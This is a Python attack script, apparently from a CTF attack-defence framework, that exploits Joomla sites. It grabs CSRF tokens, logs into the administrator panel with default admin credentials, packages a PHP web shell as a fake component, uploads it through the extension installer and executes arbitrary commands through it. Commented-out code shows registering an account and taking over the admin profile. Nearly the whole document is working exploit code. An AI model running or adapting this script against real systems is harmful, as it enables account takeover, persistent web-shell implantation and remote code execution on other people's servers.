#!/usr/bin/env python

import requests,re
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
from random import randint

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    echo file_get_contents($_POST[444]);

    '''

    try:
        data = cmd 
        #res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
	res = attack(target,target_port,data)
        # Even though we can not execute the cmd with the vuln, but we can read flag
        # and we want to use our framework to carry out this attack
        # not do the replicate tasks to code a new script
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res


import requests
import hashlib 
import time
import re
import os




def attack(ip,port,cmd):

    ### config ####
    pattern = 'name=\"([0-9a-f]{32})'
    admin_id = '476'

    ################

    my_socket = ip + ':' + str(port)
    my_time_hash = '_' + hashlib.md5('xxxx' + str(ip) + str(port) + str(time.time())).hexdigest()
    # my_time_hash = '_' + hashlib.md5('xxxx' + str(ip) + str(port) + str(666)).hexdigest()

    my_shell = "<?php system($_REQUEST['%s']);?>" %(my_time_hash)

    session = requests.Session()

    print 'my hash => ' + my_time_hash

 #    # in case the register is unavailiable

    

 #    # get token

 #    paramsGet = {"task":"register"}
 #    rawBody = "\r\n"
 #    headers = {"Origin":"http://127.0.0.1","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","Connection":"close","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36","Referer":"http://127.0.0.1/index.php/component/users/?view=registration","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6"}
 #    response = session.get("http://%s/index.php/component/users/"%my_socket, data=rawBody, params=paramsGet, headers=headers,timeout=2)

 #    # print("Status code:   %i" % response.status_code)
 #    # print("Response body: %s" % response.content)

 #    token = re.findall(pattern,response.content)[0]
    
 #    '''

 #    # register new user

 #    paramsGet = {"task":"registration.register"}
 #    paramsPostDict = {"task":"registration.register","jform[name]":"%s"%my_time_hash,"jform[email2]":"%s@gmail.com"%my_time_hash,"jform[email1]":"%s@gmail.com"%my_time_hash,"%s"%token:"1","jform[password2]":"%s"%my_time_hash,"jform[username]":"%s"%my_time_hash,"jform[password1]":"%s"%my_time_hash,"option":"com_users"}
 #    for x in paramsPostDict:
	# paramsPostDict[x] = (None,paramsPostDict[x])
 #    print paramsPostDict
 #    headers = {"Origin":"http://127.0.0.1","Cache-Control":"max-age=0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36","Referer":"http://127.0.0.1/index.php/component/users/?view=registration","Connection":"close","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6"}
 #    response = session.post("http://%s/index.php/component/users/"%my_socket, files=paramsPostDict, params=paramsGet, headers=headers)


 #    # print("Status code:   %i" % response.status_code)
 #    # print("Response body: %s" % response.content)
 #    '''



 #    # login
 #    username = '_ac648deda661642569a5d5e2e117377f'
 #    password = '_ac648deda661642569a5d5e2e117377f'

 #    paramsPost = {"password":"%s"%username,"task":"user.login","Submit":"","return":"aHR0cDovLzEyNy4wLjAuMS9pbmRleC5waHA=","username":"%s"%password,"option":"com_users","%s"%token:"1"}
 #    headers = {"Origin":"http://127.0.0.1","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36","Referer":"http://127.0.0.1/index.php","Connection":"close","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6","Content-Type":"application/x-www-form-urlencoded"}
 #    response = session.post("http://%s/index.php"%my_socket, data=paramsPost, headers=headers,timeout=2)

 #    # print("Status code:   %i" % response.status_code)
 #    # print("Response body: %s" % response.content)

 #    # get token

 #    paramsGet = {"task":"register"}
 #    rawBody = "\r\n"
 #    headers = {"Origin":"http://127.0.0.1","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","Connection":"close","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36","Referer":"http://127.0.0.1/index.php/component/users/?view=registration","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6"}
 #    response = session.get("http://%s/index.php/component/users/"%my_socket, data=rawBody, params=paramsGet, headers=headers,timeout=2)

 #    token = re.findall(pattern,response.content)[0]



 #    # admin take over

 #    paramsGet = {"task":"profile.save"}
 #    paramsPostDict = {"jform[id]":"%s"%str(admin_id),"jform[params][helpsite]":"","jform[email2]":"%s@gmail.com"%my_time_hash,"jform[email1]":"%s@gmail.com"%my_time_hash,"jform[params][admin_language]":"","%s"%token:"1","jform[params][language]":"","jform[params][timezone]":"","task":"profile.save","jform[name]":"admin","jform[password2]":"%s"%my_time_hash,"jform[params][admin_style]":"","jform[username]":"admin","jform[params][editor]":"","jform[password1]":"%s"%my_time_hash,"option":"com_users"}
 #    for x in paramsPostDict:
	# paramsPostDict[x] = (None,paramsPostDict[x])
 #    headers = {"Origin":"http://127.0.0.1","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36","Referer":"http://127.0.0.1/index.php/component/users/profile?layout=edit","Connection":"close","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6"}
 #    response = session.post("http://%s/index.php/component/users/"%my_socket, files=paramsPostDict, params=paramsGet, headers=headers)

 #    # print("Status code:   %i" % response.status_code)
 #    # print("Response body: %s" % response.content)

 #    # start a new session
 #    session = requests.Session()


    # get token

    rawBody = "\r\n"
    headers = {"Origin":"http://127.0.0.1","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","Connection":"close","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36","Referer":"http://127.0.0.1/index.php/component/users/?view=registration","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6"}
    response = session.get("http://%s/administrator/index.php"%my_socket, data=rawBody,headers=headers,timeout=2)

    token = re.findall(pattern,response.content)[0]

    # admin login

    paramsPost = {"task":"login","passwd":"admin","%s"%token:"1","return":"aW5kZXgucGhw","username":"admin","option":"com_login"}
    headers = {"Origin":"http://127.0.0.1","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36","Referer":"http://127.0.0.1/administrator/index.php","Connection":"close","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6","Content-Type":"application/x-www-form-urlencoded"}
    response = session.post("http://%s/administrator/index.php"%my_socket, data=paramsPost, headers=headers,timeout=2)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)

    # create the zip file

    my_dir = '/tmp/' + my_time_hash
    os.mkdir(my_dir)
    my_xml = '''<?xml version="1.0" encoding="utf-8"?>
<extension type="component" version="2.5.0" method="upgrade">
<name>%s</name>
<author>haozigege</author>
<creationDate>2017.08.03.</creationDate>
<copyright>Copyright (C) 2017 All rights reserved.</copyright>
<license>http://www.gnu.org/licenses/gpl-3.0.txt GNU/GPL</license>
<authorEmail>roland@nextendweb.com</authorEmail>
<authorUrl>http://www.nextendweb.com</authorUrl>
<version>2.0</version>
<administration>
<files>
<filename>1.php</filename>
</files>
</administration></extension>'''%(my_time_hash)
    open(my_dir + '/1.php','w').write(my_shell)
    open(my_dir + '/1.xml','w').write(my_xml)
    os.system("cd /tmp;zip -r %s.zip %s/" %(my_time_hash,my_time_hash))


    # get token

    rawBody = "\r\n"
    headers = {"Origin":"http://127.0.0.1","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","Connection":"close","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36","Referer":"http://127.0.0.1/index.php/component/users/?view=registration","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6"}
    response = session.get("http://%s/administrator/index.php?option=com_installer&view=install"%my_socket, data=rawBody,headers=headers,timeout=2)

    token = re.findall(pattern,response.content)[0]


    # upload the zip file

    paramsGet = {"view":"install","option":"com_installer"}
    paramsPostDict = {"install_url":"http://","task":"install.install","install_directory":"/var/www/html/tmp","installtype":"upload","type":"","%s"%token:"1"}
    for x in paramsPostDict:
	paramsPostDict[x] = (None,paramsPostDict[x])
    paramsPostDict['install_package'] = open('/tmp/%s.zip'%my_time_hash,'r')
    headers = {"Origin":"http://127.0.0.1","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36","Referer":"http://127.0.0.1/administrator/index.php?option=com_installer&view=install","Connection":"close","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6"}
    response = session.post("http://%s/administrator/index.php"%my_socket,files=paramsPostDict, params=paramsGet, headers=headers,timeout=2)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)

    # clean the zip
    os.system('rm -rf /tmp/%s /tmp/%s.zip' %(my_time_hash,my_time_hash))


    # execute cmd
    data = {my_time_hash:cmd}
    response = requests.post("http://%s/administrator/components/com_%s/1.php"%(my_socket,my_time_hash),data=data,timeout=2)
    print("Status code:   %i" % response.status_code)
    print response.content

    return response.content





if __name__ == '__main__':
    attack('127.0.0.1','80','ls')
